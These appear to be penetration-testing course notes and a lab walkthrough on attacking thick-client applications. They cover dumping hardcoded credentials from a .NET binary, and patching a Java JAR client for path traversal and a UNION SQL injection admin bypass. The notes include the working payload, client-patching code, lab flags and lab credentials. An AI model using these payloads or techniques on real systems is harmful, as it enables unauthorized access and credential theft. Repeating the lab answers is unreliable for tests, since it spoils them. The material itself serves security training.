- Flag: `Sh3ll_Sh0cK_123`

---

## Section 21 — Attacking Thick Client Applications

### Overview
Thick client apps run locally (not in browser). Attack surface includes hardcoded credentials, DLL hijacking, memory analysis, SQL injection, insecure storage, and improper error handling. Key distinction: two-tier (app talks directly to DB) vs three-tier (app → app server → DB).

### Tools
| Tool | Purpose |
|---|---|
| ProcMon64 | Monitor file/registry/network activity during execution |
| x64dbg | Dynamic analysis and memory dumping |
| de4dot | Deobfuscate/decompile .NET executables |
| dnSpy | Read decompiled .NET source code |
| Strings / strings64.exe | Extract strings from binaries |
| CFF Explorer / Detect It Easy | Static analysis / file format identification |

### Attack Methodology — Extracting Hardcoded Credentials
1. **Find the app** — check SMB shares (NETLOGON), installed programs, etc.
2. **Run with ProcMon** — monitor for temp files written during execution
3. **Block temp deletion** — remove Delete permissions from Temp folder so dropped files persist:
   - Right-click Temp → Properties → Security → Advanced → Disable inheritance → Convert → Edit → uncheck "Delete subfolders and files" and "Delete"
4. **Run the exe again** — capture the dropped batch file in `%TEMP%\2\`
5. **Edit the batch file** — remove `del` commands at the bottom so intermediate files survive
6. **Run modified batch** — produces `oracle.txt` (base64) and `monta.ps1`
7. **Run monta.ps1** to decode oracle.txt → `restart-service.exe`
   - If `powershell.exe` from cmd fails with InitialSessionState error, open PowerShell directly from Start menu and run `& C:\ProgramData\monta.ps1`
8. **Open in x64dbg** — Options → Preferences → uncheck all except Exit Breakpoint → File → Open
9. **Memory Map** — right-click CPU → Follow in Memory Map → find entry: Type=MAP, Size=3000, Protection=-RW--
10. **Dump** — right-click that entry → Dump Memory to File → save .bin
11. **de4dot** — drag .bin onto de4dot.exe → produces `-cleaned.bin`
12. **dnSpy** — drag `-cleaned.bin` onto dnSpy → read source code for hardcoded credentials

### Key Gotchas
- PowerShell invoked from cmd may fail with `InitialSessionState` error — open PowerShell directly from Start menu instead
- Temp folder permissions must be changed BEFORE running the exe — not after
- The MAP entry with size 3000 and -RW-- is the embedded .NET executable mapped into memory
- de4dot output is `-cleaned.bin` — drag this (not the original) into dnSpy
- x64dbg memory map auto-scrolls — click to select the row first, then right-click to dump
- Batch file generates randomly named files each run — check `%TEMP%\2\` after each run

### Lab Answers
- Target: `10.129.228.115` (ACADEMY-ACA-PIVOTAPI) — RDP as `cybervaca:&aue%C)}6g-d{w`
- Credentials found in dnSpy source: `svc_oracle:#oracle_s3rV1c3!2010`

### Critical Gotchas (learned during lab)
- Do NOT run PowerShell as Administrator — admin privileges bypass the Temp folder delete-permission block, so the batch file gets deleted before you can capture it
- Apply the permission block to `Temp\2\` directly, not just `Temp` parent
- If `monta.ps1` fails when the batch runs it, run it manually: `& C:\ProgramData\monta.ps1` from a Start menu PowerShell (not cmd)

---

## Section 22 — Exploiting Web Vulnerabilities in Thick-Client Applications

### Overview
Three-tier thick client apps are still vulnerable to web attacks (SQLi, path traversal) even though the client doesn't talk directly to the DB. This section uses a Java JAR client (`fatty-client.jar`) that connects to a server over a custom protocol.

### Full Attack Chain
1. Get files from FTP (anonymous access)
2. Add `server.fatty.htb` to hosts file
3. Extract JAR → edit `beans.xml` (port) → strip manifest hashes → repack → log in
4. Path traversal to list server filesystem and download `fatty-server.jar`
5. Decompile server JAR to understand SQL injection in login
6. Modify client to bypass password hashing → use UNION injection to log in as admin
7. Access ServerStatus features locked to user role

### Step 1 — FTP Enumeration
```
ftp <target>
# login: anonymous / (blank password)
get fatty-client.jar
get note.txt
get note2.txt
get note3.txt
bye
```

Notes reveal:
- Server moved from port 8000 → **1337**
- App requires **Java 8**
- Credentials: `qtc / clarabibi`

### Step 2 — Hosts File
Admin PowerShell:
```powershell
echo "10.129.228.115    server.fatty.htb" >> C:\Windows\System32\drivers\etc\hosts
```

### Step 3 — Patch the JAR (port fix + signature strip)

**Extract:**
```powershell
mkdir fatty-client
cp fatty-client.jar fatty-client\
cd fatty-client
jar xf fatty-client.jar
```

**Edit `beans.xml`** — change port from 8000 to 1337:
```xml
<constructor-arg index="1" value = "1337"/>
```
Also note the secret: `clarabibiclarabibiclarabibi`

**Find which file has the port reference:**
```powershell
ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
```

**Strip the JAR signature** (running the patched JAR will fail with SHA-256 digest mismatch otherwise):
- Open `META-INF\MANIFEST.MF` → delete all `Name:` and `SHA-256-Digest:` lines → leave only the 7-line header ending with a blank line:
```
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

```
- Delete `META-INF\1.RSA` and `META-INF\1.SF`

**Repack:**
```powershell
cd fatty-client
jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```

Double-click `fatty-client-new.jar` → log in with `qtc / clarabibi` → **Login Successful!**

### Step 4 — Path Traversal (get fatty-server.jar)

The FileBrowser filters `/` — to bypass, decompile with JD-GUI, edit `ClientGuiTest.java`:
```java
// Change configs to ..
ClientGuiTest.this.currentFolder = "..";
response = ClientGuiTest.this.invoker.showFiles("..");
```

Recompile:
```powershell
javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
```

Rebuild JAR:
```powershell
mkdir raw
cp fatty-client-new.jar raw\fatty-client-new-2.jar
# Extract raw\fatty-client-new-2.jar in place (right-click → Extract Here)
mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
cd raw
jar -cmf META-INF\MANIFEST.MF traverse.jar .
```

Log in → FileBrowser → Config → see `fatty-server.jar` listed.

**Download `fatty-server.jar`** — modify `Invoker.java` `open()` method to write response bytes to Desktop:
```java
import java.io.FileOutputStream;
// Inside open():
String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
FileOutputStream fos = new FileOutputStream(desktopPath);
byte[] content = this.response.getContent();
fos.write(content);
fos.close();
return "Successfully saved the file to " + desktopPath;
```
Rebuild JAR → FileBrowser → Config → type `fatty-server.jar` → Open → file lands on Desktop.

### Step 5 — SQL Injection Analysis (from decompiled server)

Decompile `fatty-server.jar` with JD-GUI. Key file: `htb/fatty/server/database/FattyDbSession.class`

Vulnerable query (username unsanitized):
```java
rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
```

Password comparison — server compares `newUser.getPassword()` with `user.getPassword()`. The client hashes the password as:
```
sha256(username + password + "clarabibimakeseverythingsecure")
```

Simple `' or '1'='1` fails because the returned user's stored password hash won't match the injected credentials' hash.

**UNION injection approach:** Inject a fake row where we control all fields including password:
```
abc' UNION SELECT 1,'abc','a@b.com','abc','admin
```
Server processes:
```sql
SELECT id,username,email,password,role FROM users WHERE username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
```
Returns fake admin user with password `abc`. If the client also sends `abc` as the password, comparison succeeds.

### Step 6 — Bypass Password Hashing in Client

Edit `htb/fatty/shared/resources/User.java` — replace `setPassword()` to send plaintext:
```java
public void setPassword(String password) {
    this.password = password;
}
```

Rebuild JAR → log in with:
- **Username:** `abc' UNION SELECT 1,'abc','a@b.com','abc','admin`
- **Password:** `abc`

Result: logged in as admin role → ServerStatus → Uname / Users / Netstat / **Ipconfig** now accessible.

### Key Gotchas
- JAR signature validation: must strip ALL `Name:/SHA-256-Digest:` blocks from MANIFEST.MF AND delete `1.RSA` and `1.SF` — missing any one of these causes a digest mismatch crash
- MANIFEST.MF must end with a trailing blank line or `jar` will error
- Path traversal: server filters `/` in the GUI input — bypass requires source-level edit of the Java client, not just input manipulation
- UNION injection fails if client still hashes the password — must patch `setPassword()` to submit plaintext
- `javac -cp` must point to the JAR for class resolution; compiled `.class` files must overwrite the ones extracted from the JAR before repacking
- Each JAR rebuild requires: compile → extract JAR to folder → overwrite `.class` files → repack with `jar -cmf`
- Verify injection worked by checking logs via FileBrowser → `../logs/error-log.txt`

### Additional Gotchas (learned during lab)
- Notepad saves as `.txt` by default — if creating MANIFEST.MF in Notepad, rename with `mv META-INF\MANIFEST.MF.txt META-INF\MANIFEST.MF` after saving
- If hosts file has no trailing newline, `Add-Content` appends to the same line instead of a new line — always verify with `cat` after adding
- Two entries for the same hostname in hosts file — Windows (and Java) use the FIRST match; the pre-existing `172.16.17.114 fatty.htb server.fatty.htb` entry is correct; do NOT add a second conflicting entry for the target's external IP
- Docker container running the fatty server is at `172.16.17.114` (internal Docker network), reachable from the RDP machine on port 1337
- When patching multiple Java files across rebuilds, keep a single `raw/` folder and overwrite `.class` files there each time before repacking — no need to recreate from scratch each round
- JD-GUI may fail to open fatty-server.jar — skip it; the SQL query and injection payload are known from the section content

### Lab Answers
- Target: `10.129.228.115` (ACADEMY-ACA-PIVOTAPI) — RDP as `cybervaca:&aue%C)}6g-d{w`
- Docker container (fatty server): `172.16.17.114:1337`
- UNION injection payload — Username: `abc' UNION SELECT 1,'abc','a@b.com','abc','admin` / Password: `abc`
- Flag (Section 22 answer): eth0 IP = `172.28.0.3`
